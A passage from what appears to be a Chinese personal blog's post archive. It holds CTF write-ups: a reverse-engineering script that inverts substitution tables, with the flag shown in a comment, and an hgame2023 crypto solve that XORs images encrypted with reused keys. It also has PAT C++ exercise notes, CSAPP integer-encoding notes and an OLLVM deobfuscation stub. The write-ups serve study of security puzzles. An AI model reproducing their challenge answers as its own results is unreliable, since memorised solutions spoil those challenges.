0x44, 0x34, 0x84, 0x73, 0x2E, 0x7F, 0xFD, 0x91, 0x41, 0xD6, 0x95, 0x18, 0xFF, 0x70, 0xC8, 0x02, 0x5F, 0x08, 0x1B, 0x6A, 0x5B, 0x19, 0xA0, 0x4D, 0x35, 0x54, 0xE9, 0x32, 0x88, 0x72, 0x07, 0x87, 0x90, 0x4A, 0x80, 0x1F, 0x9D]
by1180 = [0xE8, 0x22, 0x64, 0x9F, 0xC5, 0xD5, 0x25, 0xC9, 0x5D, 0xDF, 0xA1, 0x74, 0xCB, 0x57, 0xF7, 0xF0, 0xBD, 0x56, 0xFF, 0x33, 0x79, 0xFE, 0x87, 0xB6, 0xB1, 0x54, 0x10, 0x95, 0x8A, 0xEC, 0x7B, 0x48, 0x84, 0x3D, 0x30, 0xEF, 0x86, 0xFA, 0x97, 0x1C, 0xDC, 0xA9, 0x5A, 0xF3, 0x67, 0x18, 0x83, 0x72, 0x06, 0xB9, 0xF5, 0x05, 0x68, 0x59, 0xF2, 0xE4, 0x88, 0x5E, 0x14, 0x17, 0x11, 0x9C, 0xAB, 0xDE, 0xEB, 0x7D, 0x62, 0x9B, 0xD6, 0xF4, 0x01, 0x29, 0xBC, 0xC0, 0x69, 0xA2, 0x2B, 0x0D, 0x1D, 0x98, 0x6A, 0xBE, 0x65, 0x09, 0xF8, 0x96, 0xB4, 0x6E, 0x63, 0xE3, 0x34, 0x2D, 0xCE, 0x0A, 0xCD, 0xAA, 0x21, 0xCC, 0xE7, 0xA5, 0xDB, 0xD8, 0x03, 0xDD, 0xB2, 0x1F, 0x9D, 0x9E, 0x0E, 0x8F, 0x8B, 0xCA, 0x92, 0x0B, 0xA7, 0x5B, 0xD2, 0xCF, 0x47, 0x07, 0x04, 0xAE, 0x3B, 0xA8, 0x7C, 0x73, 0xF9, 0x35, 0xEE, 0x7A, 0xB0, 0xBA, 0x85, 0x46, 0x3E, 0x81, 0xC7, 0x40, 0x37, 0x15, 0x3A, 0x19, 0xE0, 0x1E, 0x28, 0x4A, 0x4F, 0x8C, 0xD4, 0x51, 0x2E, 0x94, 0x89, 0x2A, 0x0F, 0x7E, 0xE1, 0xC8, 0x5F, 0x4E, 0x6D, 0xF6, 0x49, 0xB8, 0x55, 0x60, 0x82, 0x20, 0x36, 0xC1, 0x0C, 0x1B, 0xC4, 0x00, 0xE5, 0xA3, 0x2C, 0xE9, 0xC2, 0xF1, 0x23, 0x3F, 0xC3, 0xB5, 0x8D, 0xD7, 0x42, 0xFC, 0x50, 0x13, 0xBB, 0x61, 0x9A, 0x44, 0xE6, 0x91, 0x2F, 0x70, 0xC6, 0x6F, 0xD1, 0x27, 0x43, 0x08, 0xDA, 0xFD, 0x52, 0x71, 0x77, 0xED, 0xE2, 0xAD, 0x16, 0x8E, 0x12, 0x4C, 0x31, 0x3C, 0x39, 0x78, 0x90, 0xBF, 0x1A, 0x76, 0x75, 0x41, 0x99, 0xD0, 0x80, 0xB7, 0x66, 0x24, 0xD3, 0x7F, 0x4B, 0x45, 0x5C, 0x53, 0x4D, 0x26, 0x32, 0xA0, 0xFB, 0xB3, 0x38, 0x6B, 0xAF, 0xA6, 0xD9, 0x02, 0xA4, 0xEA, 0x6C, 0xAC, 0x58, 0x93]
by1380 = [0x91, 0x67, 0x1A, 0xBE, 0xAB, 0xC2, 0x85, 0xD5, 0xDA, 0xCC, 0xF7, 0x5B, 0x54, 0x61, 0x05, 0xDF, 0x02, 0x70, 0x65, 0x69, 0x9A, 0x7A, 0x09, 0x92, 0x5D, 0x2A, 0xA7, 0x37, 0xFF, 0x19, 0xE6, 0x99, 0xF3, 0x1E, 0xBD, 0x82, 0x48, 0x3C, 0xE8, 0xC8, 0x66, 0x17, 0xB7, 0xA9, 0xC5, 0x4E, 0x33, 0x84, 0x45, 0xD3, 0x8B, 0x49, 0x50, 0x43, 0x8F, 0xCD, 0x73, 0x29, 0x04, 0xDC, 0x01, 0x0C, 0xDD, 0x2E, 0xFB, 0x6E, 0x0F, 0x24, 0x57, 0xE9, 0xC9, 0x7D, 0xB3, 0x40, 0x4B, 0x56, 0x6C, 0x68, 0xE2, 0x22, 0xF6, 0x80, 0xAA, 0x95, 0xD4, 0x97, 0x94, 0x21, 0x53, 0xD1, 0xE3, 0x59, 0xD2, 0xED, 0x41, 0x4D, 0x74, 0xA3, 0xA0, 0x32, 0x0D, 0xFC, 0x46, 0x34, 0xFA, 0xB1, 0x5E, 0xC6, 0x71, 0xC0, 0xE0, 0x3F, 0x13, 0x12, 0xD7, 0xEE, 0xF8, 0x26, 0xE1, 0x25, 0x88, 0x77, 0xB0, 0x8D, 0x6A, 0xEA, 0x0E, 0xD6, 0x3E, 0x03, 0x64, 0xBF, 0x8C, 0x96, 0xD9, 0xA4, 0x42, 0xAD, 0xFD, 0x16, 0x5A, 0xE4, 0x06, 0x9D, 0x07, 0x87, 0x5F, 0xAF, 0xDB, 0xC1, 0x93, 0x1C, 0xF1, 0xDE, 0xA6, 0x3A, 0xF4, 0x2C, 0x1B, 0x39, 0xE7, 0x4A, 0xC7, 0x35, 0xFE, 0x0A, 0x62, 0xF0, 0xCA, 0xEC, 0x27, 0x52, 0x23, 0x7F, 0xA5, 0x79, 0x7C, 0x75, 0x86, 0xEB, 0x60, 0xA8, 0xF5, 0x1F, 0x20, 0xC3, 0x63, 0x5C, 0x72, 0x18, 0xE5, 0x51, 0xAC, 0xB9, 0x90, 0x9F, 0x4C, 0xB2, 0xCB, 0x00, 0x6F, 0x28, 0xA1, 0xB6, 0x9B, 0xD0, 0x7B, 0x36, 0x4F, 0x9C, 0xCF, 0x98, 0x8A, 0x0B, 0x78, 0xB4, 0x7E, 0x2B, 0xEF, 0x58, 0xB5, 0xBA, 0x55, 0xB8, 0x10, 0x2F, 0x44, 0xAE, 0x89, 0x08, 0xC4, 0x3B, 0x9E, 0xF9, 0x6D, 0xF2, 0x15, 0x1D, 0x30, 0x47, 0x8E, 0x31, 0x2D, 0xD8, 0x6B, 0x3D, 0x11, 0x14, 0xA2, 0x83, 0xCE, 0xBB, 0x81, 0xBC, 0x76, 0x38]
by1780 = [0x38, 0x5A, 0xC7, 0x98, 0x15, 0x6A, 0xC9, 0x28, 0x33, 0xEA, 0xF4, 0xD9, 0xDB, 0x77, 0xB8, 0x49, 0x1B, 0x79, 0xF5, 0xFD, 0x3E, 0xA2, 0xDE, 0x17, 0xC4, 0x5E, 0xE5, 0x11, 0xB6, 0x1D, 0x86, 0xF9, 0x90, 0x78, 0x8A, 0x14, 0x12, 0xB1, 0xC2, 0x21, 0xF1, 0x02, 0x58, 0xA1, 0x23, 0x0C, 0xAD, 0xA5, 0x50, 0x48, 0x1E, 0x6D, 0xF8, 0x96, 0x9D, 0x19, 0x00, 0xBD, 0x26, 0xCE, 0xA7, 0x24, 0x2E, 0x39, 0x7B, 0xFA, 0x5F, 0xCC, 0x1A, 0x0B, 0x40, 0x0F, 0x4B, 0x82, 0xE2, 0x97, 0x10, 0x2A, 0xFC, 0x3B, 0xB2, 0x66, 0x27, 0x54, 0x07, 0xE3, 0x08, 0xA3, 0xA6, 0xED, 0x62, 0x13, 0x9C, 0x20, 0x01, 0x92, 0xE8, 0xAE, 0xBE, 0xE1, 0x0A, 0x41, 0x94, 0x80, 0xA9, 0x2F, 0x29, 0x70, 0x35, 0x16, 0xF7, 0x6B, 0xFE, 0x9E, 0x0D, 0xD3, 0x7F, 0x1F, 0xA0, 0x32, 0xD2, 0x52, 0x05, 0x76, 0x89, 0x9B, 0x7A, 0x8F, 0x99, 0xEF, 0xCF, 0x51, 0x0E, 0xEC, 0x59, 0x5C, 0x37, 0xD5, 0x8E, 0x31, 0x34, 0x2D, 0x93, 0x25, 0x1C, 0xC8, 0x5B, 0x47, 0x9F, 0x03, 0x67, 0x7E, 0x42, 0x7D, 0x3A, 0xAA, 0x57, 0xDA, 0x9A, 0xAB, 0x74, 0x72, 0xE4, 0xB7, 0x5D, 0xCD, 0x87, 0x46, 0x2B, 0x43, 0xF3, 0xD0, 0x85, 0x55, 0xBB, 0xD4, 0xC6, 0x61, 0x56, 0x04, 0x65, 0x7C, 0x88, 0xC3, 0x73, 0xBC, 0xEB, 0xDD, 0x4D, 0xE0, 0xE6, 0xC0, 0x63, 0x8D, 0xF2, 0x81, 0xF6, 0xA8, 0x3D, 0x3F, 0xA4, 0xE9, 0x4A, 0xB5, 0xF0, 0xCA, 0x8B, 0x2C, 0xD7, 0xAC, 0xC5, 0xC1, 0xBF, 0x53, 0xD1, 0x6F, 0x06, 0xE7, 0xD6, 0x09, 0x95, 0x44, 0x71, 0xB9, 0x83, 0x4C, 0x22, 0xAF, 0xB4, 0x75, 0x36, 0x30, 0xCB, 0xEE, 0x91, 0x45, 0x8C, 0x4E, 0x6E, 0x6C, 0x4F, 0x84, 0xBA, 0xFF, 0x64, 0xB3, 0x60, 0xFB, 0xB0, 0x18, 0xD8, 0xDF, 0x3C, 0x68, 0xDC, 0x69]
by1d80 = [0xD1, 0x9C, 0x68, 0xC0, 0x13, 0xAC, 0x48, 0x32, 0xA3, 0xBA, 0x4C, 0xE7, 0x6D, 0xC8, 0x1C, 0xAB, 0xE2, 0x7A, 0x42, 0xE1, 0x7B, 0x16, 0x67, 0x03, 0xAE, 0x7E, 0xAA, 0x38, 0x22, 0x02, 0x39, 0x51, 0xC7, 0x79, 0xD7, 0xCB, 0xEF, 0x62, 0x98, 0xDC, 0x53, 0x72, 0x89, 0xA5, 0x4B, 0xC6, 0x86, 0xF6, 0xFC, 0x77, 0x5A, 0xF5, 0x2E, 0x3D, 0xB2, 0xFE, 0x59, 0x27, 0x80, 0x63, 0xDD, 0x1A, 0x12, 0x5E, 0xED, 0xB0, 0xBC, 0xC4, 0x5F, 0x11, 0xC9, 0x09, 0xC5, 0x75, 0x96, 0x0A, 0x2F, 0x00, 0x17, 0x81, 0x14, 0x47, 0xBB, 0x9D, 0x8E, 0x3C, 0xD6, 0xA1, 0xE0, 0xA2, 0x26, 0x5D, 0x08, 0x6E, 0x4E, 0xF1, 0xCF, 0x73, 0x8A, 0x90, 0x0B, 0xB3, 0x3E, 0xB6, 0x1F, 0xC3, 0xB7, 0xDA, 0x8D, 0x05, 0xEE, 0x18, 0x93, 0x3A, 0x6A, 0x8C, 0x43, 0x8F, 0xEB, 0xE9, 0x5B, 0x29, 0x37, 0x1E, 0x46, 0x33, 0x31, 0xFB, 0x35, 0x34, 0x61, 0x04, 0x0E, 0x2B, 0x74, 0xF9, 0x8B, 0x2C, 0x20, 0x0C, 0x7C, 0x28, 0x5C, 0xCA, 0xE6, 0x6B, 0xD8, 0x30, 0xE4, 0x21, 0x44, 0x70, 0x06, 0xA6, 0x60, 0x41, 0x84, 0x10, 0x95, 0x4F, 0x64, 0x83, 0xD2, 0x9A, 0xBE, 0xAF, 0x9F, 0x07, 0xC1, 0xB8, 0x3B, 0x65, 0xCC, 0x57, 0xB5, 0xD9, 0x92, 0xDE, 0x0D, 0xE3, 0xF3, 0xA4, 0xBD, 0x6F, 0xD3, 0x25, 0x88, 0x71, 0xFF, 0xA9, 0x36, 0xB1, 0x78, 0x24, 0x69, 0xAD, 0x19, 0xBF, 0xFD, 0xCD, 0x4A, 0xEA, 0x87, 0x91, 0xA8, 0x66, 0x82, 0x50, 0x0F, 0x99, 0x45, 0xF2, 0xD5, 0x9B, 0x94, 0x7D, 0xCE, 0xDB, 0xB9, 0x52, 0xE5, 0xF4, 0x01, 0x7F, 0xD4, 0x15, 0x2D, 0x3F, 0x1D, 0xA7, 0xC2, 0xFA, 0x40, 0xE8, 0xA0, 0x55, 0x6C, 0xF7, 0x1B, 0x58, 0x85, 0x56, 0x9E, 0xEC, 0x97, 0x23, 0xF0, 0x4D, 0xD0, 0xF8, 0x2A, 0x49, 0xB4, 0x76, 0x54, 0xDF]

def fun2():
    for i in range(1,len(flag)-1):
        for j in range(len(by280)):
            if flag[i] == by280[j]:
                flag[i] = j
                break

def fun3():
    for i in range(1,len(flag)-1):
        for j in range(len(by380)):
            if flag[i] == by380[j]:
                flag[i] = j
                break

def fun5():
    for i in range(1,len(flag)-1):
        for j in range(len(by580)):
            if flag[i] == by580[j]:
                flag[i] = j
                break

def fun7():
    for i in range(1,len(flag)-1):
        for j in range(len(by780)):
            if flag[i] == by780[j]:
                flag[i] = j
                break

def funb():
    for i in range(1,len(flag)-1):
        for j in range(len(byb80)):
            if flag[i] == byb80[j]:
                flag[i] = j
                break

def fund():
    for i in range(1,len(flag)-1):
        for j in range(len(byd80)):
            if flag[i] == byd80[j]:
                flag[i] = j
                break
                
                
def fun11():
    for i in range(1,len(flag)-1):
        for j in range(len(by1180)):
            if flag[i] == by1180[j]:
                flag[i] = j
                break
                
def fun13():
    for i in range(1,len(flag)-1):
        for j in range(len(by1380)):
            if flag[i] == by1380[j]:
                flag[i] = j
                break
                
def fun17():
    for i in range(1,len(flag)-1):
        for j in range(len(by1780)):
            if flag[i] == by1780[j]:
                flag[i] = j
                break

def fun1d():
    for i in range(1,len(flag)-1):
        for j in range(len(by1d80)):
            if flag[i] == by1d80[j]:
                flag[i] = j
                break

fun1d()
fun17()
fun13()
fun11()
fund()
funb()
fun7()
fun5()
fun3()
fun2()
print(bytearray(flag))
index = [&#39;2&#39;, &#39;3&#39;, &#39;5&#39;, &#39;7&#39;, &#39;b&#39;, &#39;d&#39;, &#39;11&#39;, &#39;13&#39;, &#39;17&#39;, &#39;1d&#39;]
# #y0u_4r3_7h3_m4573r_0f_r3v3r51n6_!
</code></pre>
<p><img src="/./../images/image-20221130172748967.png" alt="image-20221130172748967"></p>
<p>&#x3D;&#x3D;然后这里注意的是flag[i] &#x3D; j后一定要加break，不然会无，然后第二段数据有多解，在移位操作处加&amp;0xfffffff,比如((a1[12] &lt;&lt; 6)&amp;0xffffffff)，这样才算和c代码成功转换&#x3D;&#x3D;</p>
<hr>
]]></content>
      <categories>
        <category>ctf</category>
        <category>赛题复现wp</category>
      </categories>
  </entry>
  <entry>
    <title>map题解字符串问题</title>
    <url>/2023/05/07/map%E9%A2%98%E8%A7%A3%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>PAT_basic 	C++ map1</p>
<span id="more"></span>

<h1 id="PAT乙级1003-我要通过！"><a href="#PAT乙级1003-我要通过！" class="headerlink" title="PAT乙级1003. 我要通过！"></a>PAT乙级1003. 我要通过！</h1><p>​	此题，题目就难以理解。不过现在理解了，题目其实我觉得条件二要在条件一的基础上理解，然后条件三要在条件二的基础上理解，然后需要给出例子进行推导，然后总结出结论——其实就是总结出公式</p>
<p><strong>题目：</strong></p>
<p>“<strong>答案正确</strong>”是自动判题系统给出的最令人欢喜的回复。本题属于 PAT 的“<strong>答案正确</strong>”大派送 —— 只要读入的字符串满足下列条件，系统就输出“<strong>答案正确</strong>”，否则输出“<strong>答案错误</strong>”。</p>
<p>得到“<strong>答案正确</strong>”的条件是：</p>
<ol>
<li>字符串中必须仅有 <code>P</code>、 <code>A</code>、 <code>T</code>这三种字符，不可以包含其它字符；</li>
<li>任意形如 <code>xPATx</code> 的字符串都可以获得“<strong>答案正确</strong>”，其中 <code>x</code> 或者是空字符串，或者是仅由字母 <code>A</code> 组成的字符串；</li>
<li>如果 <code>aPbTc</code> 是正确的，那么 <code>aPbATca</code> 也是正确的，其中 <code>a</code>、 <code>b</code>、 <code>c</code> 均或者是空字符串，或者是仅由字母 <code>A</code> 组成的字符串。</li>
</ol>
<p>现在就请你为 PAT 写一个自动裁判程序，判定哪些字符串是可以获得“<strong>答案正确</strong>”的。</p>
<h3 id="输入格式："><a href="#输入格式：" class="headerlink" title="输入格式："></a>输入格式：</h3><p>每个测试输入包含 1 个测试用例。第 1 行给出一个正整数 <em>n</em> (≤10)，是需要检测的字符串个数。接下来每个字符串占一行，字符串长度不超过 100，且不包含空格。</p>
<h3 id="输出格式："><a href="#输出格式：" class="headerlink" title="输出格式："></a>输出格式：</h3><p>每个字符串的检测结果占一行，如果该字符串可以获得“<strong>答案正确</strong>”，则输出 <code>YES</code>，否则输出 <code>NO</code>。</p>
<h3 id="输入样例："><a href="#输入样例：" class="headerlink" title="输入样例："></a>输入样例：</h3><pre><code class="in">10
PAT
PAAT
AAPATAA
AAPAATAAAA
xPATx
PT
Whatever
APAAATAA
APT
APATTAA
</code></pre>
<h3 id="输出样例："><a href="#输出样例：" class="headerlink" title="输出样例："></a>输出样例：</h3><pre><code class="out">YES
YES
YES
YES
NO
NO
NO
NO
NO
NO
</code></pre>
<p>题解：</p>
<pre><code class="c++">#include&lt;iostream&gt;
#include&lt;map&gt;
using namespace std;
int main(void)&#123;
    int n;
    string s;
    int p=-1,t=-1;
    cin &gt;&gt; n;
    for(int i=0;i&lt;n;i++)&#123;
        cin &gt;&gt; s;
        map&lt;char,int&gt; mp;
        //遍历字符串
        for(int j=0;j&lt;s.size();j++)&#123;
            //记录字符数量 
            mp[s[j]]++;
            //记录P,T的位置
            if(s[j] == &#39;P&#39;) p = j;
            if(s[j] == &#39;T&#39;) t = j;
        &#125; 
        //mp[&#39;A&#39;] != 0 必须要有A字符
        //mp[&#39;P&#39;] == 1 &amp;&amp; mp[&#39;T&#39;] == 1  PT字符必须要有且有一个 
        //t-p &gt; 1 P和T的位置满足中间一个距离，即中间必须有A
        //mp.size() == 3 仅有P A T
        //p*(t-p-1)==s.size()-t-1 前A数量 ×中间A数量 = 后A数量 
        if(mp[&#39;A&#39;] != 0 &amp;&amp; mp[&#39;P&#39;] == 1 &amp;&amp; mp[&#39;T&#39;] == 1 &amp;&amp; t-p != 1 &amp;&amp; mp.size() == 3 &amp;&amp; p*(t-p-1)==s.size()-t-1)
            printf(&quot;YES\n&quot;);
        else
            printf(&quot;NO\n&quot;);
    &#125;
&#125; 
</code></pre>
<p>这题本来是要计算字符A位置上数量约束，一个map就巧妙解决了所有约束太妙了。</p>
<p>申明：此题主要看柳神解答，非本人独创</p>
<p>参考链接：<a href="https://www.liuchuo.net/archives/460">1003. 我要通过！(20)-PAT乙级真题 – 柳婼 の blog (liuchuo.net)</a></p>
]]></content>
      <categories>
        <category>PAT练习</category>
      </categories>
  </entry>
  <entry>
    <title>csapp1</title>
    <url>/2023/01/09/csapp1/</url>
    <content><![CDATA[<p>学习一下csapp,第一篇</p>
<span id="more"></span>

<p>在32位系统：-2147483648	&lt;	2147483647	结果为false</p>
<p>​						int i &#x3D; -2147483648;	i	&lt;	2147483647	结果为true</p>
<p>​						-2147483648-1	&lt;	2147483647	结果为true</p>
<p>在计算机中运算是会发生溢出，假如运算后的数超过了32位，那最终结果可能是一个负数，或者是其他正整数</p>
<p>我们用linux中的gdb软件来证明其中的结论</p>
<p><img src="/./../images/image-20230109200402530.png" alt="image-20230109200402530"></p>
<p>很显然，上述超乎我们的预想</p>
<p>然而在整数运算时是符合交换律的，但是在计算机中浮点数却不符合交换律</p>
<p>这里做一个实验：用(1e20 + -1e20) + 3.14</p>
<p>结果为：3.1400000000000001</p>
<p>再用1e20 + (-1e20 + 3.14)，这里3.14对于-1e20微不足道</p>
<p>结果为：0</p>
<p>他们用有限的位组合形式表示在数域中无线扩张的数</p>
<p><img src="/./../images/image-20230109202910325.png" alt="image-20230109202910325"></p>
<h3 id="定点数和浮点数"><a href="#定点数和浮点数" class="headerlink" title="定点数和浮点数"></a>定点数和浮点数</h3><p>计算机中只能通过约定小数点的位置来表示	</p>
<ul>
<li>小数点位置约定在固定位置的数称为定点数</li>
<li>小数点位置约定为可浮动的数称为浮点数</li>
<li>定点小数用来表示浮点数的尾数部分</li>
<li>任何实数：X&#x3D;(-1)^s^ ×M×R^E^</li>
</ul>
<p>其中，S取值为0或1，用来决定数X的符号；M是一个二进制定点小数 ，称为数X的尾数（mantissa）；E是一个二进制定点整数，称为数X 的阶或指数（exponent）；R是基数（radix、base），可以为2、4和16等,计算机中只要表示S、M和E三个信息，就能确定X的值，叫浮点数</p>
<h3 id="定点数的编码表示"><a href="#定点数的编码表示" class="headerlink" title="定点数的编码表示"></a>定点数的编码表示</h3><p>浮点数（可用一个定点小数和一个定点整数来表示）</p>
<p>定点数的编码（解决正负号问题）: 原码、补码、移码、反码 （很少用）</p>
<h4 id="原码表示："><a href="#原码表示：" class="headerlink" title="原码表示："></a>原码表示：</h4><p><img src="/./../images/image-20230114214440623.png" alt="image-20230114214440623"></p>
<ul>
<li>其中由上图得0有两种表示，不唯一</li>
<li>加减方式，对于同号，取绝对值相加，然后在加上符号，对于异号，是比较哪个绝对值大，然后大的间小的，然后再加上绝对值大的符号。这样加减方式繁琐不统一</li>
</ul>
<p>&#x3D;&#x3D;从 50年代开始，整数都采用补码来表示 但浮点数的尾数用原码定点小数表示&#x3D;&#x3D;</p>
<h3 id="补码-模运算（modular运算）"><a href="#补码-模运算（modular运算）" class="headerlink" title="补码 - 模运算（modular运算）"></a>补码 - 模运算（modular运算）</h3><p>在一个模运算系统中，一个数与它除以“模”后的余数等价</p>
<p>一个负数的补码等于模减该负数的绝对值</p>
<p>对于某一确定的模，某数减去小于模的另一数，总可 以用该数加上另一数负数的补码来代替</p>
<p><strong>补码（modular运算）：+ 和– 的统一</strong></p>
<p>例1：“钟表”模运算系统 假定时针只能顺拨，从10点倒拨4格后是几点？ </p>
<p>10- 4 &#x3D; 10+(12- 4) &#x3D; 10+8 &#x3D; 6（mod 12）</p>
<p><img src="/./../images/image-20230114220017752.png" alt="image-20230114220017752"></p>
<h3 id="结论：一个负数的补码等于将对应正数补码-各位取反、末位加一"><a href="#结论：一个负数的补码等于将对应正数补码-各位取反、末位加一" class="headerlink" title="结论：一个负数的补码等于将对应正数补码 各位取反、末位加一"></a>结论：一个负数的补码等于将对应正数补码 各位取反、末位加一</h3><p>补码的定义 假定补码有n位，则：[X]补&#x3D; 2n + X （-2n-1≤X＜2n-1 ，mod 2n）</p>
<p>X是真值，[x]补是机器数</p>
<h2 id="求特殊数的补码"><a href="#求特殊数的补码" class="headerlink" title="求特殊数的补码"></a>求特殊数的补码</h2><p>假定机器数有n位：</p>
<p>① [-2^n-1^]<del>补</del>&#x3D; 2^n^ - 2^n-1^ &#x3D; 10…0（n-1个0） （mod 2^n^）</p>
<p>② [-1]<del>补</del>&#x3D; 2^n^ - 0…01 &#x3D; 11…1（n个1） （mod 2^n^)</p>
<p>③ [+0]<del>补</del>&#x3D; [-0]<del>补</del>&#x3D; 00…0（n个0）</p>
<h2 id="变形补码的表示"><a href="#变形补码的表示" class="headerlink" title="变形补码的表示"></a>变形补码的表示</h2><p>变形（4’s）补码：双符号，用于存放可能溢出的中间结果</p>
<p><img src="/./../images/image-20230117124905779.png" alt="image-20230117124905779"></p>
<p>求真值的补码:</p>
<p>简便方法：从右向左遇到第一个1的前面各位取反</p>
<p>求补码的真值:</p>
<p>简便求法： 符号为0，则为正数，数值部分相同 符号为1，则为负数，数值各位取反，末位加1</p>
<p><img src="/./../images/image-20230117125216871.png" alt="image-20230117125216871"></p>
<h2 id="移码表示Excess"><a href="#移码表示Excess" class="headerlink" title="移码表示Excess"></a>移码表示Excess</h2><ul>
<li>什么是移码表示？<ul>
<li>将每一个数值加上一个偏置常数（ Excess &#x2F; bias）</li>
</ul>
</li>
<li>通常，当编码位数为n时，bias取 2^n-1^ 或 2^n-1^-1（如 IEEE 754)</li>
</ul>
<p><img src="/./../images/image-20230117125707755.png" alt="image-20230117125707755"></p>
<ul>
<li>为什么要用移码来表示指数（阶码）?<ul>
<li>便于浮点数加减运算时的对阶操作（比较大小）</li>
</ul>
</li>
</ul>
<p><img src="/./../images/image-20230117125855689.png" alt="image-20230117125855689"></p>
<h2 id="带符号整数"><a href="#带符号整数" class="headerlink" title="带符号整数"></a>带符号整数</h2><p>有三种定点编码方式：</p>
<ul>
<li>Signed and magnitude （原码）：定点小数，用来表示浮点数的尾数</li>
<li>Excess (biased) notion （移码）：定点整数，用于表示浮点数的阶（指数）</li>
<li>Two’s complement （补码）：50年代以来，所有计算机都用补码来表示带符号整数</li>
</ul>
<p>为什么用补码表示带符号整数？</p>
<ul>
<li>补码运算系统是模运算系统，加、减运算统一</li>
<li>数0的表示唯一，方便使用</li>
<li>比原码多表示一个最小负数</li>
</ul>
<p>无符号数:常在一个数的后面加一个“u”或“U”表示无符号数</p>
<p>&#x3D;&#x3D;若同时有无符号和带符号整数，则C编译器将带符号整数强制转换为无符号数&#x3D;&#x3D;</p>
<p><img src="/./../images/image-20230117152023145.png" alt="image-20230117152023145"></p>
<p>带*的与预想的不同</p>
<p><img src="/./../images/image-20230117152423930.png" alt="image-20230117152423930"></p>
<h4 id="编译器处理常量时默认的类型"><a href="#编译器处理常量时默认的类型" class="headerlink" title="编译器处理常量时默认的类型"></a>编译器处理常量时默认的类型</h4><p><img src="/./../images/image-20230117153309750.png" alt="image-20230117153309750"></p>
<p>C表达式-2147483648 &lt; 2147483647的执行结 果为false，这是因为编译器在编译时，是把符号和字面量分开识别，先识别字面量2147483648，2147483648在C90中时2^31^,属于unsigned int，所以此次比较是根据无符号数来进行比较。</p>
<p>若定义变量“int i&#x3D;-2147483648;”，则“i &lt; 2147483647”的执行 结果为true，这个不用解释，int类型已经定义好类型了，不需要再判别</p>
<p>如果将表达式写成“-2147483647-1 &lt; 2147483647”，则结果会怎 样呢？是true</p>
<p>不过C99的标准不一样，看上面的表就知道</p>
]]></content>
      <categories>
        <category>re</category>
        <category>前置知识</category>
      </categories>
      <tags>
        <tag>csapp</tag>
      </tags>
  </entry>
  <entry>
    <title>ollvm做法</title>
    <url>/2023/01/02/ollvm%E5%81%9A%E6%B3%95/</url>
    <content><![CDATA[<p>unicorn start</p>
<span id="more"></span>

<h3 id="目标-处理ollvm混淆"><a href="#目标-处理ollvm混淆" class="headerlink" title="目标:处理ollvm混淆"></a>目标:处理ollvm混淆</h3><p><img src="/./../images/image-20230102221120506.png" alt="image-20230102221120506"></p>
<p><img src="/./../images/image-20230102221205367.png" alt="image-20230102221205367"></p>
<h3 id="用脚本处理该函数"><a href="#用脚本处理该函数" class="headerlink" title="用脚本处理该函数"></a>用脚本处理该函数</h3><p>在脚本中设置起始地址和文件名</p>
<p><img src="/./../images/image-20230102221258379.png" alt="image-20230102221258379"></p>
<p>然后执行该python文件</p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>常见混淆技术</category>
      </categories>
  </entry>
  <entry>
    <title>hgame2023</title>
    <url>/2023/01/14/hgame2023/</url>
    <content><![CDATA[<p>复现hgame</p>
<span id="more"></span>

<h1 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h1><h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="兔兔的车票"><a href="#兔兔的车票" class="headerlink" title="兔兔的车票"></a>兔兔的车票</h3><p>题目：</p>
<pre><code class="py">from PIL import Image
from Crypto.Util.number import *
from random import shuffle, randint, getrandbits

flagImg = Image.open(&#39;flag.png&#39;)
width = flagImg.width
height = flagImg.height

def makeSourceImg():
    colors = long_to_bytes(getrandbits(width * height * 24))[::-1]
    #生成图像吧
    img = Image.new(&#39;RGB&#39;, (width, height))
    x = 0
    #写像素
    for i in range(height):
        for j in range(width):
            img.putpixel((j, i), (colors[x], colors[x + 1], colors[x + 2]))
            x += 3
    return img

def xorImg(keyImg, sourceImg):
    # 生成图片
    img = Image.new(&#39;RGB&#39;, (width, height)) 
    for i in range(height):
        for j in range(width):
            p1, p2 = keyImg.getpixel((j, i)), sourceImg.getpixel((j, i))
            img.putpixel((j, i), tuple([(p1[k] ^ p2[k]) for k in range(3)]))
    return img

n1 = makeSourceImg()
n2 = makeSourceImg()
n3 = makeSourceImg()
nonce = [n1, n2, n3]    #三张图片

index = list(range(16)) #生成0~16的序列
shuffle(index)  # 打乱序列
e=0


&quot;&quot;&quot;
这里flag.png已经提前被保存在source文件夹下了，文件名也是picture&#123;xx&#125;.png
&quot;&quot;&quot;

for i in index:
    im = Image.open(f&quot;source/picture&#123;i&#125;.png&quot;)
    key = nonce[randint(0, 2)]
    encImg = xorImg(key, im)
    encImg.save(f&#39;pics/enc&#123;e&#125;.png&#39;)
    e+=1
</code></pre>
<p>解法：原先我看着只有enc.png,其他啥都没有，怎么个异或？后来也注意到key只有三个，考虑过重复的情况，但是我发现仅有一个enc.png,还是没法搞出原图，后来看了别人的wp，才知道，只要flag.png^picture.png就行，因为它的picture.png原本的就没啥像素，enc.png大部分还是key的像素，所以找到一张存在flag.png的图片，将key异或掉就行，最终虽然得不到真正得flag.png但模糊程度也不高。这里对16张图片笛卡尔积级别异或就行</p>
<p>最后解密代码：</p>
<pre><code class="py">from PIL import Image
from Crypto.Util.number import *
from random import shuffle, randint, getrandbits

flagImg = Image.open(f&#39;pics/enc&#123;0&#125;.png&#39;)
width = flagImg.width
height = flagImg.height
flagImg.close()

def xorImg(keyImg, sourceImg):
    # 生成图片
    img = Image.new(&#39;RGB&#39;, (width, height)) 
    for i in range(height):
        for j in range(width):
            p1, p2 = keyImg.getpixel((j, i)), sourceImg.getpixel((j, i))
            img.putpixel((j, i), tuple([(p1[k] ^ p2[k]) for k in range(3)]))
    return img


for i in range(16):
    for j in range(16):
        imi = Image.open(f&quot;pics/enc&#123;i&#125;.png&quot;)
        imj = Image.open(f&quot;pics/enc&#123;j&#125;.png&quot;)
        xorimg = xorImg(imj, imi)
        xorimg.save(f&#39;source/xor&#123;i*16+j&#125;.png&#39;)
        imi.close()
        imj.close()
</code></pre>
<p>最后获得模糊的flag图片：</p>
<p><img src="/./../images/xor246.png" alt="xor246"></p>
<h3 id="神秘的电话"><a href="#神秘的电话" class="headerlink" title="神秘的电话"></a>神秘的电话</h3><p>题目：</p>
<p>一个疑似base64编码的txt文件</p>
